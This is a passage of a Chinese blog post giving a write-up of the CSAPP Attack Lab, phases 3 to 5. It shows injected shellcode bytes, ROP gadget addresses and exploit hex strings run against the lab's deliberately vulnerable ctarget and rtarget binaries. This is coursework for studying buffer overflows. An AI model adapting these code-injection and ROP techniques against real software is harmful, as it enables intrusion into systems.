+<p>汇编代码为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $0x5561dcb8,%rdi</span><br><span class="line">pushq $0x4018fa</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p>构造字符串为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 b8 </span><br><span class="line">dc 61 55 68 </span><br><span class="line">fa 18 40 00 </span><br><span class="line">c3 00 00 00 </span><br><span class="line">35 39 62 39 </span><br><span class="line">39 37 66 61 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">78 dc 61 55</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">35 39 62 39</span><br><span class="line">39 37 66 61</span><br><span class="line">00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<p>运行程序：</p>
+<p><img src="/images/2017-7-9/Screen%20Shot%202017-05-21%20at%2016.19.59.png" alt="Screen Shot 2017-05-21 at 16.19.59"></p>
+<p>成功！</p>
+<h2 id="第四阶段"><a href="#第四阶段" class="headerlink" title="第四阶段"></a>第四阶段</h2><p>从第四阶段开始，我们要对 <code>rtarget</code> 进行缓冲区攻击。但是攻击 <code>rtarget</code> 要更加困难，因为它采用了两种方法来防止缓冲区攻击：</p>
+<ol>
+<li>栈的内容是随机的，每次运行时，栈中内容的地址都不一样。所以我们无法决定应该跳转的地址。</li>
+<li>栈中代码是不可以执行的，所以即使我们可以跳转到注入代码，程序也会遇到段错误。</li>
+</ol>
+<p>幸运的是，我们可以通过执行已有的代码来达到我们的目的，而不是注入新的代码，这种方法被称为 <code>return-oriented-programming</code>（ROP）。ROP 的策略是在程序中找到指定的字节序列，这些字节序列包含某些指令并以<code>ret</code>结尾。这样的一个字节序列被称为一个 <em>gadget</em>。</p>
+<p><img src="/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2020.09.59.png" alt="Screen Shot 2017-07-09 at 20.09.59"><br>由上图可以看出，栈可以用来设置跳转到 n 个 <em>gadget*，并执行其中的代码。使用这种方式，利用 <code>ret</code> 指令，我们可以运行一连串的 *gadget</em> 并执行其中的代码。</p>
+<p>例如下面的代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setval_210</span><span class="params">(<span class="keyword">unsigned</span> *p)</span> </span>&#123;</span><br><span class="line">    *p = <span class="number">3347663060U</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>它对应的汇编代码为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000400f15 &lt;setval_210&gt;:</span><br><span class="line">  400f15:       c7 07 d4 48 89 c7       movl   $0xc78948d4,(%rdi)</span><br><span class="line">  400f1b:       c3                      retq</span><br></pre></td></tr></table></figure>
+
+<p>字节序列 <code>48 89 c7</code> 编码了指令 <code>movq %rax, %rdi</code>，这个字节序列后面跟着 <code>c3</code>，也就是 <code>ret</code> 指令，它可以让我们跳入下一个 <em>gadget</em>。那么我们就可以利用字节序列的开始地址 <code>0x400f19</code> 还使用指令。</p>
+<p>指令的16进制编码可以在下表中查看：</p>
+<p><img src="/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2020.20.34.png" alt="Screen Shot 2017-07-09 at 20.20.34"><br><img src="/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2020.20.54.png" alt="Screen Shot 2017-07-09 at 20.20.54"><br><img src="/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2020.21.01.png" alt="Screen Shot 2017-07-09 at 20.21.01"><br><img src="/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2020.21.10.png" alt="Screen Shot 2017-07-09 at 20.21.10"></p>
+<p>另外两个指令是：</p>
+<ul>
+<li><code>ret</code>：字节编码为 <code>0xc3</code></li>
+<li><code>nop</code>：让程序计数器加一，什么都不做，字节编码为<code>0x90</code></li>
+</ul>
+<p>在终端运行命令 <code>objdump -d rtarget &gt; rtarget.txt</code>，以寻找目标代码。<br>现在我们要重复第二阶段的任务：将自己的 cookie 作为参数传入 <code>touch2</code>。我们需要做三步：</p>
+<ol>
+<li>将 cookie 传入<code>%rdi</code>中</li>
+<li>将 <code>touch2</code> 地址放入栈中</li>
+<li>执行 <code>touch2</code></li>
+</ol>
+<p>为了将 cookie 存入 <code>%rdi</code>，最简单的想法是先将 cookie 存入栈中，再从栈中弹出。但是找不到 <code>popq %rdi</code>，只找到了 <code>popq %rax</code>，代码地址为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:   8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:   c3                      retq</span><br></pre></td></tr></table></figure>
+
+<p>所以我们的第一个 <em>gadget</em> 的地址为 <code>0x4019ab</code>。</p>
+<p>后面的动作可以用下面的汇编代码完成：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">popq %rax</span><br><span class="line">movq %rax %edi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p>其中 <code>movq %rax %edi</code> 的字节码为：<code>48 89 c7 c3</code>。我们可以在下面的代码中找到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:   c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:   c3                      retq</span><br></pre></td></tr></table></figure>
+
+<p>所以我们第二个 <em>gadget</em> 的地址为 <code>0x4019c5</code>。</p>
+<p>所以我们要构造的文件应该包含三部分，首先是40字节的缓冲区，然后是 <code>gadget1</code> 的地址，cookie，<code>gadget2</code> 的地址，最后是 <code>touch2</code> 的地址。构造 rtarget4.txt 如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cc cc cc cc cc cc cc cc cc cc                                                                                           </span><br><span class="line">cc cc cc cc cc cc cc cc cc cc</span><br><span class="line">cc cc cc cc cc cc cc cc cc cc</span><br><span class="line">cc cc cc cc cc cc cc cc cc cc</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00  </span><br><span class="line">c5 19 40 00 00 00 00 00  </span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<p>我们先生成它的二进制码：<code>.\hex2raw &lt; rtarget4.txt &gt; rtarget4_r.txt</code>。<br>然后执行 <code>.\rtarget -i rtarget4_r.txt -q</code>，得到：</p>
+<p><img src="/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2017.13.01.png" alt="Screen Shot 2017-07-09 at 17.13.01"></p>
+<p>成功。</p>
+<h2 id="第五阶段"><a href="#第五阶段" class="headerlink" title="第五阶段"></a>第五阶段</h2><p>阶段五的目标和阶段三一样，首先使用 cookie 构造字符串，然后将字符串作为参数传入 <code>touch3</code>。</p>
+<p>首先，我们把 cookie 转换成 ascii 码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x59b997fa -&gt; 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
+
+<p>我们接下来的思路为：</p>
+<ol>
+<li>获得 <code>%rsp</code> 的地址</li>
+<li>将（栈的起始地址）+（cookie 的偏移量）放入某个寄存器中</li>
+<li>将寄存器的值放入 <code>%rdi</code> 中</li>
+<li>调用 <code>touch3</code></li>
+</ol>
+<p>首先，寻找 <code>movq %rsp, %rax</code>, <code>48 89 e0</code>。</p>
+<p>我们可以找到如下代码片段：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000401aab &lt;setval_350&gt;:</span><br><span class="line">  401aab:   c7 07 48 89 e0 90       movl   $0x90e08948,(%rdi)</span><br><span class="line">  401ab1:   c3                      retq</span><br></pre></td></tr></table></figure>
+
+<p>所以 <code>gadget1</code> 的地址为 <code>0x401aad</code>。</p>
+<p>接下来，我们需要递增 <code>%rax</code> 的地址，我们可以找到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:   48 8d 04 37             lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:   c3                      retq</span><br></pre></td></tr></table></figure>
+
+<p>得 <code>gadget2</code> 的地址为：<code>0x4019d8</code>。</p>
+<p>接下来要将 <code>%rax</code> 的内容移动到 <code>%rdi</code> 中，找到 <code>mov %rax, %rdi</code>, <code>48 89 c7</code> 的代码片段：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:   c3                      retq</span><br></pre></td></tr></table></figure>
+
+<p>得到 <code>gadget3</code> 的地址为：<code>0x4019a2</code>。</p>
+<p>最后，攻击文件应该包括：填充区1，gadget1，gadget2，gadget3，touch3的地址，填充区2，cookie。第二个填充区的大小为55(0x37) - 3 * 8 = 31字节。<code>rtarget5.txt</code> 的内容为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cc cc cc cc cc cc cc cc cc cc                                                                                           </span><br><span class="line">cc cc cc cc cc cc cc cc cc cc</span><br><span class="line">cc cc cc cc cc cc cc cc cc cc</span><br><span class="line">cc cc cc cc cc cc cc cc cc cc</span><br><span class="line">ad 1a 40 00 00 00 00 00</span><br><span class="line">d8 19 40 00 00 00 00 00  </span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00</span><br><span class="line">dd dd dd dd dd dd dd dd dd dd</span><br><span class="line">dd dd dd dd dd dd dd dd dd dd</span><br><span class="line">dd dd dd dd dd dd dd dd dd dd</span><br><span class="line">dd</span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
+
+<p>我们先生成它的二进制码：<code>.\hex2raw &lt; rtarget5.txt &gt; rtarget5_r.txt</code>。<br>然后执行 <code>.\rtarget -i rtarget5_r.txt -q</code>，得到：</p>
+<p><img src="/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2019.58.10.png" alt="Screen Shot 2017-07-09 at 19.58.10"></p>
+<p>成功。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次实验真的加深了我对内存和缓冲区的理解。以前上专业课，所有的知识都停留在书本上，没有做到学以致用。而这次实验，通过汇编、反汇编的、拼凑内存内容的方式直接和操作系统底层打交道，真的很有趣，但是也很要求精确。</p>
+<p>现在看看，我们平时用高级语言写与系统无关的代码是一件多么幸福的事情啊。</p>
+<p>我觉得学习操作系统，阅读 CSAPP，就是让我能够站在系统工作原理的粒度上理解代码，理解 C 语言和汇编，这种思考方式和视角才是阅读 CSAPP 和完成这些实验之后，我获得的最大的收获。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/" rel="tag"># 计算机科学</a>
+              <a href="/tags/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/" rel="tag"># 深入理解计算机系统</a>
+              <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/" rel="tag"># 计算机系统</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2017/05/31/python-data-model/" rel="prev" title="Python 中的 Data Model">
+      <i class="fa fa-chevron-left"></i> Python 中的 Data Model
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2017/07/11/python-decorator/" rel="next" title="Python 中的装饰器和闭包">
+      Python 中的装饰器和闭包 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#第一阶段"><span class="nav-number">1.</span> <span class="nav-text">第一阶段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第二阶段"><span class="nav-number">2.</span> <span class="nav-text">第二阶段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第三阶段"><span class="nav-number">3.</span> <span class="nav-text">第三阶段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第四阶段"><span class="nav-number">4.</span> <span class="nav-text">第四阶段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第五阶段"><span class="nav-number">5.</span> <span class="nav-text">第五阶段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">6.</span> <span class="nav-text">总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Chuanlei Guo</p>
+  <div class="site-description" itemprop="description">正因为未知，人与人之间的羁绊才愈发迷人</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ChuanleiGuo" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ChuanleiGuo" rel="noopener" target="_blank"><i class="github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:chuanleiguo@gmail.com" title="E-Mail → mailto:chuanleiguo@gmail.com" rel="noopener" target="_blank"><i class="envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="http://weibo.com/bestchuan" title="Weibo → http:&#x2F;&#x2F;weibo.com&#x2F;bestchuan" rel="noopener" target="_blank"><i class="weibo fa-fw"></i>Weibo</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2016 – 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Chuanlei Guo</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+<script>
+  function loadCount() {
+    var d = document, s = d.createElement('script');
+    s.src = 'https://chuanleiguo-com.disqus.com/count.js';
+    s.id = 'dsq-count-scr';
+    (d.head || d.body).appendChild(s);
+  }
+  // defer loading until the whole page loading is completed
+  window.addEventListener('load', loadCount, false);
+</script>
+<script>
+  var disqus_config = function() {
+    this.page.url = "http://chuanleiguo.com/2017/07/09/csapp-attacklab/";
+    this.page.identifier = "2017/07/09/csapp-attacklab/";
+    this.page.title = "【深入理解计算机系统实验笔记】| Attack Lab";
+    };
+  NexT.utils.loadComments(document.querySelector('#disqus_thread'), () => {
+    if (window.DISQUS) {
+      DISQUS.reset({
+        reload: true,
+        config: disqus_config
+      });
+    } else {
+      var d = document, s = d.createElement('script');
+      s.src = 'https://chuanleiguo-com.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', '' + +new Date());
+      (d.head || d.body).appendChild(s);
+    }
+  });
+</script>
+
+</body>
+</html>
